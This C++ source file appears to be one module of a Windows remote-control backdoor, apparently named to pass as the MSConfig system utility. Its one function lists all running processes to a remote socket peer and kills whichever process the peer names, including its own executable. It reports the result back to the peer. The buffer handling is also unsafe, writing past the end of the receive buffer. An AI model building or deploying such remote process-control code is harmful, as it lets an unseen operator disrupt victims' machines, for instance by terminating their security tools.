#include "MSConfig.h"

void terminate(SOCKET& ConnectSocket)
{
     char command[1024], response[1024];
     int res;
     string totr;
     PROCESSENTRY32 pe;
     pe.dwSize = sizeof( PROCESSENTRY32 );
     HANDLE hw;
     
     hw = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     Process32First(hw, &pe);
     do
     {
                        strcpy(command, pe.szExeFile);
                        strcat(command, "+");
                        Sleep(50);
                        send(ConnectSocket, command, (int)strlen(command), 0);
                        totr.clear();
                        do
                        {
                                     res = recv(ConnectSocket, response, 1024, 0);
                                     response[res] = '\0';
                                     totr += response;
                        } while (totr[totr.length() - 1] != '+');
     } while (Process32Next(hw, &pe));
     CloseHandle(hw);
     
     strcpy(command, "\n");
     strcat(command, "+");
     send(ConnectSocket, command, (int)strlen(command), 0);
     
     totr.clear();
     do
     {
                         res = recv(ConnectSocket, response, 1024, 0);
                         response[res] = '\0';
                         totr += response;
     } while (totr[totr.length() - 1] != '+');
     totr.erase(totr.length() - 1, 1);

     bool killed = false;
     hw = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     Process32First(hw, &pe);
     do
     {
                        if (totr == pe.szExeFile)
                        {
                                 if (totr == "MSConfig.exe")
                                 {
                                          strcpy(command, "OK+");
                                          send(ConnectSocket, command, (int)strlen(command), 0);
                                 }
                                 TerminateProcess(OpenProcess(PROCESS_TERMINATE, false, pe.th32ProcessID), 1);
                                 killed = true;
                        }
     } while (Process32Next(hw, &pe));
     CloseHandle(hw);
     
     if (killed) strcpy(command, "OK+");
     else strcpy(command, "NO+");
     send(ConnectSocket, command, (int)strlen(command), 0);
     
     return;
}
